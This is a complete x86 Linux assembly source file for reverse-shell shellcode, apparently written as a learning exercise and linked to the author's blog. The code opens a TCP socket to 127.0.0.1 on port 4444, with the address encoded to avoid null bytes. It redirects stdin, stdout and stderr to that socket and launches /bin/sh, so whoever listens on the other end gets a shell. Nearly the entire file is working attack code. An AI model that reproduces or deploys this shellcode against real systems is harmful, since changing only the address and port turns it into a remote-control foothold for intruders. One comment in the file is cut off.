; Filename: reverse_shell.nasm
; Author:  Gal Nagli
; Blog:  naglinagli.github.io

global _start			

section .text
_start:
	
; setting up the socket
	xor ebx, ebx    ; zeroing out the ebx register
	mul ebx	       ; zeroing out eax and edx registers

	mov al, 0x66    ; setting eax to the socket_call SYSCALL
	mov bl, 0x01     ; assigning 1 to ebx register (SYS_SOCKET)	 
  
	push edx        ; push 0 to the stack (IPPROTO_IP)
	push ebx        ; push 1 to the stack (SOCK_STREAM)
	push 0x2        ; push 2 to the stack (AF_INET)

	mov ecx, esp    ; keep 1st argument address in ecx
	int 0x80         ; syscall
	mov edi, eax	; saving the file descriptor

; Connection
	
	xor ebx, ebx	; zeroing out ebx register
	mul ebx		; zeroing out eax and edx registers
	mov al, 0x66	
	mov bl, 0x03	; set ebx value to 3, (SYS_CONECT)
	
	mov ecx, 0x03020280	; set ecx register 3.2.2.128
	sub ecx, 0x02020201	; decrement 2.1.1.1
	push ecx		; push localhost (127.0.0.1) NULL-FREE
	push word 0x5C11       ; push the port number (4444)
	push word 0x02	       ; AF_INET syscall
		
	mov ecx, esp    ; keep 1st argument address in ecx.
	push byte 0x10    ; push the address length (addrlen)
	push ecx        ; sockaddr structure
	push edi        ; socketfd (file descriptors)
	mov ecx, esp    ; ecx holds the args array for the syscall
	int 0x80        ; init syscall



; Redirect the file descriptors using dup2

	pop ebx		; moving the file descriptor from the stacl
	xor eax, eax	; zeroing out the eax register
	xor ecx, ecx    ; clearing ecx before using the loop
	mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-s$
       jns looper

; Execute /bin/sh with execve

       xor ebx, ebx
       mul ebx

       ; PUSH //bin/sh (8 bytes)
	push edx	; push nullbyte to the stuck
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp
	mov ecx, edx

	mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
	int 0x80
